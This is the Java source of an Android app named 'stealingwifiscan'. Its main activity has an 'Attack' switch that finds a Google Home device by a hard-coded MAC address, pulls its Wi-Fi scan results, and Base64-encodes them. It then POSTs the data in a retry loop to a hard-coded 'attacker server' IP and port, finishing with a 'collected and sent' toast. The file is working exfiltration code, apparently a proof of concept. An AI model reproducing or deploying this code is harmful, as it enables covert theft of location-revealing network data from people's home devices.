package com.yinhao.stealingwifiscan;

import android.app.ProgressDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.support.v7.widget.SwitchCompat;
import android.util.Base64;
import android.widget.CompoundButton;
import android.widget.TextView;
import android.widget.Toast;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity implements ThreadCompleteListener {

    private TextView mSwitchText;
    private SwitchCompat mAttackSwitch;
    private HomeDeviceInfo mGHDInfo;
    private ProgressDialog mLoadingDlg;
    public static String OurHomeMac = "F4:F5:D8:C1:B9:2E";
    private String mGHDIP = "";
    private String mScanResults;
    private NotifyingThread mAttackThread;
    private NotifyingThread mSendServerThread;
    private String AttackThreadLabel = "attack_thread";
    private String SendServerThreadLabel = "server_thread";
    private String mAttackerServerIP = "192.168.201.10";
    private String mAttackerServerPort = "50000";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mSwitchText = (TextView) findViewById(R.id.switchText);
        mAttackSwitch = (SwitchCompat) findViewById(R.id.AttackSwitch);

        mAttackSwitch.setChecked(false);
        mLoadingDlg = new ProgressDialog(MainActivity.this);
        mLoadingDlg.setMessage("Searching for Target Google Home and Exploit, Please Hold......");
        mLoadingDlg.setCancelable(false);
        mLoadingDlg.setInverseBackgroundForced(false);


        //response to attack switch
        mAttackSwitch.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if(isChecked){
                    mSwitchText.setText("Attack is on");
                    mSwitchText.setTextColor(getResources().getColor(R.color.colorAccent));
                    initilize_attackthread();
                    mAttackThread.start();

                    mLoadingDlg.show();

                }else{
                    mSwitchText.setText("Attack is off");
                    mSwitchText.setTextColor(getResources().getColor(R.color.colorGrey));
                    mAttackThread.interrupt();
                }

            }
        });
    }

    private void initilize_attackthread() {
        mAttackThread = new NotifyingThread() {
            @Override
            public void doRun() {
                try {
                    mGHDInfo = new HomeDeviceInfo();
                    mGHDIP = mGHDInfo.getIPfromMac(OurHomeMac);
                    if (!mGHDIP.matches("")) {
                        System.out.println("Google Home Device Found!! With IP Address " + mGHDIP);
                        mScanResults = mGHDInfo.getScanResults();
                    }
                }
                catch (IOException e) {
                    e.printStackTrace();
                }
            }
        };

        mAttackThread.label = AttackThreadLabel;
        mAttackThread.addListener(MainActivity.this);

    }

    private void init_sendserver(){
        mSendServerThread = new NotifyingThread() {
            @Override
            public void doRun() {
                while (true) {

                    try {
                        URL url = new URL("http://" + mAttackerServerIP + ":" + mAttackerServerPort);
                        DataOutputStream printout;
                        HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                        urlConnection.setRequestMethod("POST");
                        urlConnection.setDoInput (true);
                        urlConnection.setDoOutput (true);
                        urlConnection.setUseCaches (false);
                        byte[] data = mScanResults.getBytes("UTF-8");
                        String base64_data = Base64.encodeToString(data, Base64.DEFAULT);
                        byte[] base64_databytes = base64_data.getBytes();
                        urlConnection.setFixedLengthStreamingMode(base64_databytes.length);
                        urlConnection.connect();
                        printout = new DataOutputStream(urlConnection.getOutputStream());
                        printout.write(base64_databytes);
                        printout.flush ();
                        printout.close ();
                        urlConnection.disconnect();
                        mSendServerThread.interrupt();
                        break;

                    } catch (IOException e) {
                        e.printStackTrace();
                        try {
                            Thread.sleep(2000);
                        } catch (InterruptedException e1) {
                            e1.printStackTrace();
                        }
                    }

                }
            }
        };
        mSendServerThread.label = SendServerThreadLabel;
        mSendServerThread.addListener(MainActivity.this);
    }

    @Override
    public void notifyOfThreadComplete(NotifyingThread thread) {
        //wait for Attack Thread to finish
        if (thread.label.matches(AttackThreadLabel)) {


            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    mSwitchText.setText("Attack is off");
                    mSwitchText.setTextColor(getResources().getColor(R.color.colorGrey));
                    mAttackSwitch.setChecked(false);
                }
            });

            //send packets to server
            init_sendserver();
            mSendServerThread.start();
        }

        if(thread.label.matches(SendServerThreadLabel)) {
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    mLoadingDlg.hide();
                    Toast.makeText(MainActivity.this, "Data has been collected and sent!", Toast.LENGTH_LONG).show();
                }
            });

        }
    }
}
